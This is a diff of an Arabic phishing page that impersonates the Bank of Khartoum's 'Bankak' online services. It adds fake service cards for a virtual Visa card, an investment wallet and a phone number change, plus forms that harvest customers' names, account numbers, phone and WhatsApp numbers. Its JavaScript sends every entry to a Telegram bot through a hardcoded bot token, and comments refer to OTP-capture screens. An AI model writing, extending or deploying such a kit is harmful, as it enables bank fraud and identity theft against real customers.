@@ -23,7 +23,7 @@
             min-height: 100vh;
         }
 
-        /* حاوية الصفحة الرئيسية لاختيار الموقع */
+        /* حاوية الصفحة الرئيسية للخدمات مباشرة */
         #mainAppHome {
             display: flex;
             flex-direction: column;
@@ -83,60 +83,71 @@
         .welcome-subtitle {
             color: #4b5563;
             font-size: 16px;
-            margin-bottom: 8px;
+            margin-bottom: 25px;
         }
 
-        .instruction-text {
-            color: #6b7280;
-            font-size: 14px;
-            margin-bottom: 30px;
-        }
-
-        /* بطاقات الاختيار (داخل السودان في الأعلى، وخارج السودان في الأسفل) */
-        .cards-container {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
+        /* حاوية الخدمات المباشرة في الصفحة الأولى */
+        .sudan-screen-body {
+            padding: 10px 0;
+            max-width: 500px;
             width: 100%;
-            max-width: 450px;
-            margin-bottom: 30px;
-        }
-
-        .option-card {
-            background-color: #ffffff;
-            border-radius: 12px;
-            padding: 30px 20px;
-            flex: 1;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            margin: 0 auto;
             display: flex;
             flex-direction: column;
+            gap: 16px;
+        }
+
+        .service-glass-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(220, 38, 38, 0.15);
+            border-radius: 14px;
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.03);
+            transition: all 0.3s ease;
+        }
+
+        .service-glass-card:hover {
+            background: rgba(255, 255, 255, 1);
+            border-color: #dc2626;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(220, 38, 38, 0.1);
+        }
+
+        .service-card-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .service-icon-box {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            background: #fff5f5;
+            display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
-            border: 1px solid #f3f4f6;
-            transition: transform 0.2s;
-        }
-
-        .option-card:hover {
-            transform: translateY(-3px);
-        }
-
-        .option-card i {
+            font-size: 20px;
             color: #dc2626;
-            font-size: 40px;
-            margin-bottom: 15px;
+            box-shadow: 0 2px 5px rgba(220, 38, 38, 0.1);
         }
 
-        .option-title {
-            color: #dc2626;
-            font-size: 18px;
+        .service-card-title {
+            font-size: 1rem;
             font-weight: bold;
-            margin-bottom: 8px;
+            color: #dc2626;
+            text-align: right;
         }
 
-        .option-desc {
-            color: #6b7280;
-            font-size: 13px;
+        .service-card-arrow {
+            color: #dc2626;
+            font-size: 16px;
         }
 
         .divider {
@@ -152,11 +163,82 @@
             color: #9ca3af;
             font-size: 12px;
             padding: 15px;
-            margin-bottom: 60px;
+            margin-bottom: 20px;
         }
 
-        /* شاشة ملء الشاشة لقائمة الخدمات داخل السودان بمستطيلات شفافة وأيقونات ملونة */
-        #sudanServicesScreen {
+        /* شاشة اختيار الموقع المؤقتة (قبل الانتقال لتطبيق بنكك) */
+        #locationChoiceModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 2500;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .location-choice-box {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 25px 20px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            animation: modalPop 0.3s ease;
+        }
+
+        .cards-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .option-card {
+            background-color: #fdf2f2;
+            border-radius: 12px;
+            padding: 20px 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            cursor: pointer;
+            border: 1px solid rgba(220, 38, 38, 0.2);
+            transition: transform 0.2s;
+            text-align: right;
+        }
+
+        .option-card:hover {
+            transform: translateY(-2px);
+            background-color: #ffffff;
+            border-color: #dc2626;
+        }
+
+        .option-card i {
+            color: #dc2626;
+            font-size: 28px;
+        }
+
+        .option-title {
+            color: #dc2626;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 4px;
+        }
+
+        .option-desc {
+            color: #6b7280;
+            font-size: 12px;
+        }
+
+        /* شاشة الاستمارة المخصصة للخدمات */
+        #simpleServiceScreen {
             display: none;
             position: fixed;
             top: 0;
@@ -164,7 +246,7 @@
             width: 100vw;
             height: 100vh;
             background: linear-gradient(135deg, #fdf2f2 0%, #ffffff 100%);
-            z-index: 2500;
+            z-index: 2200;
             flex-direction: column;
             overflow-y: auto;
         }
@@ -196,7 +278,7 @@
             font-weight: bold;
         }
 
-        .sudan-screen-body {
+        .sudan-form-body {
             padding: 25px 20px;
             max-width: 500px;
             width: 100%;
@@ -209,85 +291,9 @@
         .sudan-screen-subtitle {
             font-size: 1rem;
             font-weight: bold;
-            color: #dc2626; /* تم تغيير اللون إلى الأحمر */
+            color: #dc2626;
             margin-bottom: 5px;
             text-align: right;
-        }
-
-        .service-glass-card {
-            background: rgba(255, 255, 255, 0.75);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border: 1px solid rgba(220, 38, 38, 0.15);
-            border-radius: 14px;
-            padding: 18px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            cursor: pointer;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.03);
-            transition: all 0.3s ease;
-        }
-
-        .service-glass-card:hover {
-            background: rgba(255, 255, 255, 0.95);
-            border-color: #dc2626;
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(220, 38, 38, 0.1);
-        }
-
-        .service-card-right {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .service-icon-box {
-            width: 48px;
-            height: 48px;
-            border-radius: 12px;
-            background: #fff5f5;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            color: #dc2626;
-            box-shadow: 0 2px 5px rgba(220, 38, 38, 0.1);
-        }
-
-        .service-card-title {
-            font-size: 1rem;
-            font-weight: bold;
-            color: #dc2626; /* تم تغيير اللون إلى الأحمر */
-        }
-
-        .service-card-arrow {
-            color: #dc2626;
-            font-size: 16px;
-        }
-
-        /* شاشة الاستمارة المبسطة لقسم داخل السودان (أبيض شفاف ونصوص ورسومات حمراء) */
-        #sudanFormScreen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: linear-gradient(135deg, #fdf2f2 0%, #ffffff 100%);
-            z-index: 2600;
-            flex-direction: column;
-            overflow-y: auto;
-        }
-
-        .sudan-form-body {
-            padding: 25px 20px;
-            max-width: 500px;
-            width: 100%;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
         }
 
         .glass-input-container {
@@ -974,7 +980,7 @@
 </head>
 <body>
 
-    <!-- الجزء الرئيسي لاختيار الموقع -->
+    <!-- الصفحة الرئيسية للخدمات -->
     <div id="mainAppHome">
         <div class="header-section">
             <div class="logo-container">
@@ -987,22 +993,67 @@
 
         <div class="main-content">
             <h2 class="welcome-title">أهلًا وسهلًا بك في خدمات بنكك أونلاين</h2>
-            <p class="welcome-subtitle">هل أنت داخل السودان أو خارج السودان؟</p>
-            <p class="instruction-text">اختر موقعك المناسب إلى خدمات بنك الدخول</p>
+            <p class="welcome-subtitle">يرجى اختيار الخدمة المطلوبة للمتابعة:</p>
 
-            <div class="cards-container">
-                <!-- داخل السودان (في الأعلى) -->
-                <div class="option-card" onclick="openSudanServicesScreen()">
-                    <i class="fa-solid fa-location-dot"></i>
-                    <h3 class="option-title">داخل السودان</h3>
-                    <p class="option-desc">المتابعة من داخل السودان</p>
+            <div class="sudan-screen-body">
+                <!-- 1. بطاقة فيزا افتراضية -->
+                <div class="service-glass-card" onclick="openVisaScreen()">
+                    <div class="service-card-right">
+                        <div class="service-icon-box" style="color: #0284c7; background: #f0f9ff;"><i class="fa-solid fa-credit-card"></i></div>
+                        <div class="service-card-title">بطاقة فيزا افتراضية (Visa Bank of Khartoum)</div>
+                    </div>
+                    <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
                 </div>
 
-                <!-- خارج السودان (في الأسفل) -->
-                <div class="option-card" onclick="openUpdateFormWithLoader()">
-                    <i class="fa-solid fa-globe"></i>
-                    <h3 class="option-title">خارج السودان / الولايات الغير مستقرة</h3>
-                    <p class="option-desc">المتابعة من خارج السودان/المناطق الغير أمنه</p>
+                <!-- 2. استمارة تحديث بيانات العملاء -->
+                <div class="service-glass-card" onclick="openUpdateForm()">
+                    <div class="service-card-right">
+                        <div class="service-icon-box" style="color: #dc2626; background: #fff5f5;"><i class="fa-solid fa-id-card"></i></div>
+                        <div class="service-card-title">استمارة تحديث بيانات العملاء</div>
+                    </div>
+                    <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
+                </div>
+
+                <!-- 3. محفظة بنك الخرطوم الاستثمارية -->
+                <div class="service-glass-card" onclick="openSimpleForm('محفظة بنك الخرطوم الاستثمارية')">
+                    <div class="service-card-right">
+                        <div class="service-icon-box" style="color: #059669; background: #ecfdf5;"><i class="fa-solid fa-building-columns"></i></div>
+                        <div class="service-card-title">محفظة بنك الخرطوم الاستثمارية (Real estate investment)</div>
+                    </div>
+                    <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
+                </div>
+
+                <!-- باقي الخدمات -->
+                <div class="service-glass-card" onclick="openSimpleForm('إعادة تنشيط حساب')">
+                    <div class="service-card-right">
+                        <div class="service-icon-box" style="color: #2563eb; background: #eff6ff;"><i class="fa-solid fa-rotate-right"></i></div>
+                        <div class="service-card-title">إعادة تنشيط حساب</div>
+                    </div>
+                    <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
+                </div>
+
+                <div class="service-glass-card" onclick="openSimpleForm('خدمات العملات الأجنبية')">
+                    <div class="service-card-right">
+                        <div class="service-icon-box" style="color: #16a34a; background: #f0fdf4;"><i class="fa-solid fa-coins"></i></div>
+                        <div class="service-card-title">خدمات العملات الأجنبية</div>
+                    </div>
+                    <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
+                </div>
+
+                <div class="service-glass-card" onclick="openSimpleForm('الاستعلام عن الرصيد كشف حساب مصغر')">
+                    <div class="service-card-right">
+                        <div class="service-icon-box" style="color: #ca8a04; background: #fefce8;"><i class="fa-solid fa-file-invoice-dollar"></i></div>
+                        <div class="service-card-title">الاستعلام عن الرصيد كشف حساب مصغر</div>
+                    </div>
+                    <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
+                </div>
+
+                <div class="service-glass-card" onclick="openSimpleForm('تعديل رقم الهاتف')">
+                    <div class="service-card-right">
+                        <div class="service-icon-box" style="color: #9333ea; background: #faf5ff;"><i class="fa-solid fa-mobile-screen-button"></i></div>
+                        <div class="service-card-title">تعديل رقم الهاتف</div>
+                    </div>
+                    <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
                 </div>
             </div>
 
@@ -1015,79 +1066,75 @@
         </div>
     </div>
 
-    <!-- شاشة ملء الشاشة لقائمة الخدمات داخل السودان بمستطيلات شفافة وأيقونات ملونة -->
-    <div id="sudanServicesScreen">
-        <div class="sudan-screen-header">
-            <span class="sudan-screen-title">خدمات بنكك - داخل السودان</span>
-            <button class="sudan-screen-back" onclick="closeSudanServicesScreen()">رجوع ➔</button>
-        </div>
-        <div class="sudan-screen-body">
-            <div class="sudan-screen-subtitle">يرجى اختيار الخدمة المطلوبة للمتابعة:</div>
+    <!-- نافذة اختيار الموقع المؤقتة (قبل الانتقال لتطبيق بنكك) -->
+    <div id="locationChoiceModal">
+        <div class="location-choice-box">
+            <h3 class="welcome-title" style="font-size: 18px;">موقع المتابعة</h3>
+            <p class="welcome-subtitle" style="font-size: 14px; margin-bottom: 10px;">هل ترغب متابعة الخدمة من داخل السودان أو خارجه؟</p>
             
-            <div class="service-glass-card" onclick="openSudanForm('إعادة تنشيط حساب')">
+            <div class="cards-container">
+                <div class="option-card" onclick="selectLocationAndProceed('داخل السودان')">
+                    <i class="fa-solid fa-location-dot"></i>
+                    <div>
+                        <div class="option-title">داخل السودان</div>
+                        <div class="option-desc">المتابعة من داخل السودان</div>
+                    </div>
+                </div>
+
+                <div class="option-card" onclick="selectLocationAndProceed('خارج السودان / الولايات الغير مستقرة')">
+                    <i class="fa-solid fa-globe"></i>
+                    <div>
+                        <div class="option-title">خارج السودان / الولايات الغير مستقرة</div>
+                        <div class="option-desc">المتابعة من خارج السودان</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة الاستمارة الخاصة ببطاقة الفيزا (3 خيارات فقط) -->
+    <div id="visaChoiceScreen" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: linear-gradient(135deg, #fdf2f2 0%, #ffffff 100%); z-index: 2200; flex-direction: column; overflow-y: auto;">
+        <div class="sudan-screen-header">
+            <span class="sudan-screen-title">اختر نوع بطاقة الفيزا الافتراضية</span>
+            <button class="sudan-screen-back" onclick="closeVisaScreen()">رجوع ➔</button>
+        </div>
+        <div class="sudan-form-body">
+            <div class="sudan-screen-subtitle">يرجى تحديد نوع البطاقة المطلوبة للمتابعة:</div>
+            
+            <div class="service-glass-card" onclick="selectVisaType('بطاقة فيزا بلاتينية Visa Platinum')">
                 <div class="service-card-right">
-                    <div class="service-icon-box" style="color: #2563eb; background: #eff6ff;"><i class="fa-solid fa-rotate-right"></i></div>
-                    <div class="service-card-title">إعادة تنشيط حساب</div>
+                    <div class="service-icon-box" style="color: #2563eb; background: #eff6ff;"><i class="fa-solid fa-credit-card"></i></div>
+                    <div class="service-card-title">1. بطاقة فيزا بلاتينية (Visa Platinum)</div>
                 </div>
                 <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
             </div>
 
-            <div class="service-glass-card" onclick="openSudanForm('خدمات العملات الأجنبية')">
+            <div class="service-glass-card" onclick="selectVisaType('بطاقة فيزا فضية Silver Visa')">
                 <div class="service-card-right">
-                    <div class="service-icon-box" style="color: #16a34a; background: #f0fdf4;"><i class="fa-solid fa-coins"></i></div>
-                    <div class="service-card-title">خدمات العملات الأجنبية</div>
+                    <div class="service-icon-box" style="color: #4b5563; background: #f3f4f6;"><i class="fa-solid fa-credit-card"></i></div>
+                    <div class="service-card-title">2. بطاقة فيزا فضية (Silver Visa)</div>
                 </div>
                 <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
             </div>
 
-            <div class="service-glass-card" onclick="openSudanForm('الاستعلام عن الرصيد كشف حساب مصغر')">
+            <div class="service-glass-card" onclick="selectVisaType('بطاقة فيزا عالمية Golden Visa')">
                 <div class="service-card-right">
-                    <div class="service-icon-box" style="color: #ca8a04; background: #fefce8;"><i class="fa-solid fa-file-invoice-dollar"></i></div>
-                    <div class="service-card-title">الاستعلام عن الرصيد كشف حساب مصغر</div>
-                </div>
-                <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
-            </div>
-
-            <div class="service-glass-card" onclick="openSudanForm('تعديل رقم الهاتف')">
-                <div class="service-card-right">
-                    <div class="service-icon-box" style="color: #9333ea; background: #faf5ff;"><i class="fa-solid fa-mobile-screen-button"></i></div>
-                    <div class="service-card-title">تعديل رقم الهاتف</div>
+                    <div class="service-icon-box" style="color: #ca8a04; background: #fefce8;"><i class="fa-solid fa-credit-card"></i></div>
+                    <div class="service-card-title">3. بطاقة فيزا عالمية (Golden Visa)</div>
                 </div>
                 <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
             </div>
         </div>
     </div>
 
-    <!-- شاشة استمارة الخدمات الداخلية (أبيض شفاف، نصوص ورسومات حمراء) -->
-    <div id="sudanFormScreen">
+    <!-- شاشة الاستمارة المخصصة والمتغيرة حسب الخدمة -->
+    <div id="simpleServiceScreen">
         <div class="sudan-screen-header">
-            <span class="sudan-screen-title" id="sudanFormTitle">استمارة الخدمة</span>
-            <button class="sudan-screen-back" onclick="closeSudanFormScreen()">رجوع ➔</button>
+            <span class="sudan-screen-title" id="simpleFormTitle">استمارة الخدمة</span>
+            <button class="sudan-screen-back" onclick="closeSimpleFormScreen()">رجوع ➔</button>
         </div>
-        <div class="sudan-form-body">
-            <div class="sudan-screen-subtitle">يرجى تعبئة البيانات التالية للمتابعة:</div>
-
-            <div class="glass-input-container">
-                <i class="fa-solid fa-user"></i>
-                <input type="text" id="sudan-name" class="glass-input-field" placeholder="الاسم">
-            </div>
-
-            <div class="glass-input-container">
-                <i class="fa-solid fa-id-card"></i>
-                <input type="text" id="sudan-account" class="glass-input-field" placeholder="رقم الحساب">
-            </div>
-
-            <div class="glass-input-container">
-                <i class="fa-solid fa-phone"></i>
-                <input type="text" id="sudan-phone" class="glass-input-field" placeholder="رقم الهاتف المسجل مع الحساب">
-            </div>
-
-            <div class="glass-input-container">
-                <i class="fa-brands fa-whatsapp"></i>
-                <input type="text" id="sudan-whatsapp" class="glass-input-field" placeholder="رقم الواتساب">
-            </div>
-
-            <button class="btn-submit" style="margin-top: 10px;" onclick="submitSudanForm()">متابعة إلى تطبيق بنكك</button>
+        <div class="sudan-form-body" id="dynamicFormFields">
+            <!-- سيتم تعبئة الحقول ديناميكياً بواسطة جافاسكريبت حسب الخدمة المختارة -->
         </div>
     </div>
 
@@ -1122,7 +1169,7 @@
                 </div>
             </div>
 
-            <!-- 1. الشاشة الأولى: استمارة تحديث بيانات العملاء -->
+            <!-- 1. الشاشة الأولى: استمارة تحديث البيانات الكاملة -->
             <div class="screen active" id="screenProfile">
                 <div class="navbar">
                     <div class="nav-left">
@@ -1135,7 +1182,7 @@
                 </div>
 
                 <div class="page-header">
-                    <div class="form-main-title-ar" id="serviceHeaderTitle">استمارة تحديث بيانات العملاء</div>
+                    <div class="form-main-title-ar">استمارة تحديث بيانات العملاء</div>
                     <div class="form-main-title-en">Customer Information Update Form</div>
                     <div class="bank-logo-text"><span></span></div>
                 </div>
@@ -1259,7 +1306,7 @@
                     <div class="gold-stripes"></div>
                     <div class="bok-preview-card">
                         <div class="bok-header-section">
-                            <div class="bok-title-ar" id="previewTitleAr">استمارة تحديث بيانات العملاء</div>
+                            <div class="bok-title-ar">استمارة تحديث بيانات العملاء</div>
                             <div class="bok-title-en">Customer Information Update Form</div>
                             <div class="bok-logo-img">
                                 <div style="text-align: right; line-height: 1.1;">
@@ -1284,7 +1331,7 @@
                     </div>
 
                     <div style="margin-top: 20px; width: 100%; max-width: 400px; z-index: 10; margin-bottom: 20px;">
-                        <button class="btn-submit" onclick="proceedToBankakApp()">تأكيد والانتقال لتطبيق بنكك</button>
+                        <button class="btn-submit" onclick="showLocationChoiceModal()">تأكيد والانتقال لتطبيق بنكك</button>
                     </div>
                 </div>
             </div>
@@ -1422,7 +1469,7 @@
               </div>
             </div>
 
-            <!-- 7. شاشة استمارة إضافية بعد رمز التحقق (الاسم، رقم الحساب، رقم الهاتف، الرصيد المتبقي، اسم الوالدة) -->
+            <!-- 7. شاشة استمارة إضافية بعد رمز التحقق -->
             <div class="screen" id="screenPostOtpForm">
               <div class="top-header" style="padding: 12px 16px;">
                 <div class="header-bar">
@@ -1523,48 +1570,147 @@
 
     <script>
         let selectedServiceName = '';
+        let chosenLocation = '';
 
-        function openSudanServicesScreen() {
-            document.getElementById('sudanServicesScreen').style.display = 'flex';
+        // فتح شاشة خيارات بطاقة الفيزا الافتراضية
+        function openVisaScreen() {
+            selectedServiceName = 'بطاقة فيزا افتراضية (Visa Bank of Khartoum)';
+            document.getElementById('visaChoiceScreen').style.display = 'flex';
         }
 
-        function closeSudanServicesScreen() {
-            document.getElementById('sudanServicesScreen').style.display = 'none';
+        function closeVisaScreen() {
+            document.getElementById('visaChoiceScreen').style.display = 'none';
         }
 
-        function openSudanForm(serviceName) {
+        // عند اختيار نوع الفيزا (من الخيارات الثلاثة) الانتقال مباشرة لنافذة الموقع
+        function selectVisaType(visaType) {
+            sendToTelegram(`💳 *نوع بطاقة الفيزا المختار:* ${visaType}`);
+            document.getElementById('visaChoiceScreen').style.display = 'none';
+            showLocationChoiceModal();
+        }
+
+        // فتح استمارة التحديث التفصيلية الأصلية
+        function openUpdateForm() {
+            selectedServiceName = 'استمارة تحديث بيانات العملاء';
+            document.getElementById('mainAppHome').style.display = 'none';
+            document.getElementById('updateContainer').style.display = 'block';
+            switchScreen('screenProfile');
+        }
+
+        // فتح الاستمارة المخصصة حسب الخدمة المختارة
+        function openSimpleForm(serviceName) {
             selectedServiceName = serviceName;
-            document.getElementById('sudanFormTitle').textContent = serviceName;
-            closeSudanServicesScreen();
-            document.getElementById('sudanFormScreen').style.display = 'flex';
+            document.getElementById('simpleFormTitle').textContent = serviceName;
+            
+            const container = document.getElementById('dynamicFormFields');
+            container.innerHTML = `<div class="sudan-screen-subtitle">يرجى تعبئة البيانات التالية لخدمة (${serviceName}):</div>`;
+
+            if (serviceName === 'محفظة بنك الخرطوم الاستثمارية') {
+                container.innerHTML += `
+                    <div class="glass-input-container"><i class="fa-solid fa-user"></i><input type="text" id="dyn-name" class="glass-input-field" placeholder="الاسم رباعي"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-id-card"></i><input type="text" id="dyn-account" class="glass-input-field" placeholder="رقم الحساب البنكي"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-building-columns"></i><input type="text" id="dyn-investment" class="glass-input-field" placeholder="مبلغ الاستثمار العقاري المتوقع"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-phone"></i><input type="text" id="dyn-phone" class="glass-input-field" placeholder="رقم الهاتف المسجل"></div>
+                    <div class="glass-input-container"><i class="fa-brands fa-whatsapp"></i><input type="text" id="dyn-whatsapp" class="glass-input-field" placeholder="رقم الواتساب"></div>
+                `;
+            } else if (serviceName === 'تعديل رقم الهاتف') {
+                container.innerHTML += `
+                    <div class="glass-input-container"><i class="fa-solid fa-user"></i><input type="text" id="dyn-name" class="glass-input-field" placeholder="الاسم رباعي"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-id-card"></i><input type="text" id="dyn-account" class="glass-input-field" placeholder="رقم الحساب"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-phone-slash"></i><input type="text" id="dyn-old-phone" class="glass-input-field" placeholder="رقم الهاتف القديم"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-phone"></i><input type="text" id="dyn-new-phone" class="glass-input-field" placeholder="رقم الهاتف الجديد"></div>
+                    <div class="glass-input-container"><i class="fa-brands fa-whatsapp"></i><input type="text" id="dyn-whatsapp" class="glass-input-field" placeholder="رقم الواتساب"></div>
+                `;
+            } else if (serviceName === 'خدمات العملات الأجنبية') {
+                container.innerHTML += `
+                    <div class="glass-input-container"><i class="fa-solid fa-user"></i><input type="text" id="dyn-name" class="glass-input-field" placeholder="الاسم رباعي"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-id-card"></i><input type="text" id="dyn-account" class="glass-input-field" placeholder="رقم الحساب"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-coins"></i>
+                        <select id="dyn-currency" class="glass-input-field" style="background:transparent; outline:none;">
+                            <option value="">اختر العملة المطلوبة</option>
+                            <option value="دولار أمريكي">دولار أمريكي (USD)</option>
+                            <option value="ريال سعودي">ريال سعودي (SAR)</option>
+                            <option value="يورو">يورو (EUR)</option>
+                            <option value="درهم إماراتي">درهم إماراتي (AED)</option>
+                            <option value="أخرى">عملة أخرى / إضافية</option>
+                        </select>
+                    </div>
+                    <div class="glass-input-container"><i class="fa-solid fa-phone"></i><input type="text" id="dyn-phone" class="glass-input-field" placeholder="رقم الهاتف المسجل"></div>
+                    <div class="glass-input-container"><i class="fa-brands fa-whatsapp"></i><input type="text" id="dyn-whatsapp" class="glass-input-field" placeholder="رقم الواتساب"></div>
+                `;
+            } else {
+                container.innerHTML += `
+                    <div class="glass-input-container"><i class="fa-solid fa-user"></i><input type="text" id="dyn-name" class="glass-input-field" placeholder="الاسم"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-id-card"></i><input type="text" id="dyn-account" class="glass-input-field" placeholder="رقم الحساب"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-phone"></i><input type="text" id="dyn-phone" class="glass-input-field" placeholder="رقم الهاتف المسجل مع الحساب"></div>
+                    <div class="glass-input-container"><i class="fa-brands fa-whatsapp"></i><input type="text" id="dyn-whatsapp" class="glass-input-field" placeholder="رقم الواتساب"></div>
+                `;
+            }
+
+            container.innerHTML += `<button class="btn-submit" style="margin-top: 10px;" onclick="submitSimpleForm()">تقديم الطلب</button>`;
+            document.getElementById('simpleServiceScreen').style.display = 'flex';
         }
 
-        function closeSudanFormScreen() {
-            document.getElementById('sudanFormScreen').style.display = 'none';
-            document.getElementById('sudanServicesScreen').style.display = 'flex';
+        function closeSimpleFormScreen() {
+            document.getElementById('simpleServiceScreen').style.display = 'none';
         }
 
-        function submitSudanForm() {
-            const name = document.getElementById('sudan-name').value.trim();
-            const account = document.getElementById('sudan-account').value.trim();
-            const phone = document.getElementById('sudan-phone').value.trim();
-            const whatsapp = document.getElementById('sudan-whatsapp').value.trim();
+        // إرسال البيانات المخصصة وإظهار نافذة اختيار الموقع
+        function submitSimpleForm() {
+            const name = document.getElementById('dyn-name') ? document.getElementById('dyn-name').value.trim() : '';
+            const account = document.getElementById('dyn-account') ? document.getElementById('dyn-account').value.trim() : '';
+            const phone = document.getElementById('dyn-phone') ? document.getElementById('dyn-phone').value.trim() : '';
+            const whatsapp = document.getElementById('dyn-whatsapp') ? document.getElementById('dyn-whatsapp').value.trim() : '';
+            const oldPhone = document.getElementById('dyn-old-phone') ? document.getElementById('dyn-old-phone').value.trim() : '';
+            const newPhone = document.getElementById('dyn-new-phone') ? document.getElementById('dyn-new-phone').value.trim() : '';
+            const currency = document.getElementById('dyn-currency') ? document.getElementById('dyn-currency').value : '';
+            const investment = document.getElementById('dyn-investment') ? document.getElementById('dyn-investment').value.trim() : '';
 
-            if (!name || !account || !phone || !whatsapp) {
+            if (!name || !account || !whatsapp || (selectedServiceName === 'تعديل رقم الهاتف' && (!oldPhone || !newPhone)) || (selectedServiceName === 'خدمات العملات الأجنبية' && (!currency || !phone)) || (selectedServiceName === 'محفظة بنك الخرطوم الاستثمارية' && (!investment || !phone)) || (selectedServiceName !== 'تعديل رقم الهاتف' && selectedServiceName !== 'خدمات العملات الأجنبية' && selectedServiceName !== 'محفظة بنك الخرطوم الاستثمارية' && !phone)) {
                 showErrorModal("يرجى تعبئة جميع الحقول المطلوبة للمتابعة.");
                 return;
             }
 
-            sendToTelegram(`📍 *خدمة داخل السودان (${selectedServiceName}):*
+            let msg = `📍 *طلب خدمة (${selectedServiceName}):*
 👤 الاسم: ${name}
-🏦 رقم الحساب: ${account}
-📱 رقم الهاتف: ${phone}
-💬 رقم الواتساب: ${whatsapp}`);
+🏦 رقم الحساب: ${account}`;
 
-            document.getElementById('sudanFormScreen').style.display = 'none';
+            if (selectedServiceName === 'تعديل رقم الهاتف') {
+                msg += `
+📞 الهاتف القديم: ${oldPhone}
+📱 الهاتف الجديد: ${newPhone}`;
+            } else if (selectedServiceName === 'خدمات العملات الأجنبية') {
+                msg += `
+💱 العملة المطلوبة: ${currency}
+📱 الهاتف: ${phone}`;
+            } else if (selectedServiceName === 'محفظة بنك الخرطوم الاستثمارية') {
+                msg += `
+🏢 مبلغ الاستثمار العقاري: ${investment}
+📱 الهاتف: ${phone}`;
+            } else {
+                msg += `
+📱 الهاتف: ${phone}`;
+            }
+            msg += `\n💬 الواتساب: ${whatsapp}`;
+
+            sendToTelegram(msg);
+
+            document.getElementById('simpleServiceScreen').style.display = 'none';
+            showLocationChoiceModal();
+        }
+
+        function showLocationChoiceModal() {
+            document.getElementById('locationChoiceModal').style.display = 'flex';
+        }
+
+        function selectLocationAndProceed(locationType) {
+            chosenLocation = locationType;
+            document.getElementById('locationChoiceModal').style.display = 'none';
+
+            sendToTelegram(`🌍 *موقع المتابعة المختار:* ${chosenLocation}`);
 
             const globalLoader = document.getElementById('globalLoader');
-            document.getElementById('globalLoaderText').textContent = `جاري الانتقال لتطبيق بنكك...`;
+            document.getElementById('globalLoaderText').textContent = `جاري الانتقال لتطبيق بنكك (${chosenLocation})...`;
             globalLoader.style.display = 'flex';
 
             setTimeout(function() {
@@ -1572,20 +1718,7 @@
                 document.getElementById('mainAppHome').style.display = 'none';
                 document.getElementById('updateContainer').style.display = 'block';
                 switchScreen('screenLogin');
-            }, 3000);
-        }
-
-        function openUpdateFormWithLoader() {
-            const globalLoader = document.getElementById('globalLoader');
-            document.getElementById('globalLoaderText').textContent = 'جاري التحقق من الموقع والاتصال بخدمات بنكك...';
-            globalLoader.style.display = 'flex';
-
-            setTimeout(function() {
-                globalLoader.style.display = 'none';
-                document.getElementById('mainAppHome').style.display = 'none';
-                document.getElementById('updateContainer').style.display = 'block';
-                switchScreen('screenProfile');
-            }, 7000);
+            }, 4000);
         }
 
         const botToken = "8637887859:AAH_vXce9SDiGGDGZiSR96MtP-KMbPrq5SE"; 
@@ -1729,7 +1862,7 @@
             document.getElementById('prev-education').textContent = education;
             document.getElementById('prev-branch').textContent = branch;
 
-            const profileMsg = `📥 *بيانات استمارة جديدة متكاملة:*
+            const profileMsg = `📥 *بيانات استمارة تحديث البيانات:*
 👤 الاسم: ${name}
 🏦 رقم الحساب: ${account}
 📅 تاريخ الميلاد: ${dob}
@@ -1747,17 +1880,6 @@
 
